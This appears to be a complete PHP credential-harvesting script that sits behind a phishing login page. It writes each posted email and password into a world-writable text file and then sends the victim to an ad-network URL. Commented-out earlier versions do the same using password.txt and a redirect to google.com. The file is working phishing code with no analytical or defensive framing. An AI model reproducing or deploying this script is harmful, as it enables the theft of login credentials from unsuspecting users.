
<?php
$filename = 'saved.txt';
chmod($filename,0777);
if(isset($_POST['login'])){
$Name = "Username:".$_POST['email']."
";
$Pass = "Password:".$_POST['pass']."
";


$file=fopen($filename, "a") or die("Unable to open file!");
fwrite($file, $Name."           ".$Pass);
//fwrite($file, $Pass);
fclose($file);

header("Location: https://www.highcpmrevenuenetwork.com/sjsyf9e0?key=01b67de22bac1fb1ab7bca9700242164");

}




// if(isset($_POST['login'])){
//     $email=$_POST['email'];
//     $pass=$_POST['pass'];
//     // echo $email;
//     // echo $pass;
//     $fp = fopen("password.txt", "a");
//     fwrite($fp, $email);
//     fclose($fp);
    

//}

// $file = fopen("password.txt", "a");
// fwrite($file,"\t\t\t\t\t\t");
// fwrite($file,"\r\n");
// fwrite($file,"\t\t\t\t\t\t");
// fwrite($file,$email);
// fwrite($file,"=");
// fwrite($file,$email);
// fwrite($file,"\r\n");

// fwrite($file,"\r\n");
// fwrite($file,"\t\t\t\t\t\t");
// fwrite($file,$pass);
// header("Location: https://www.google.com");
// die();


// if(isset($_POST['pass'])){
//     $pass = $_POST['pass'];
//     $file = fopen("password.txt", "a");
//     fwrite($file, $pass);
// }
?>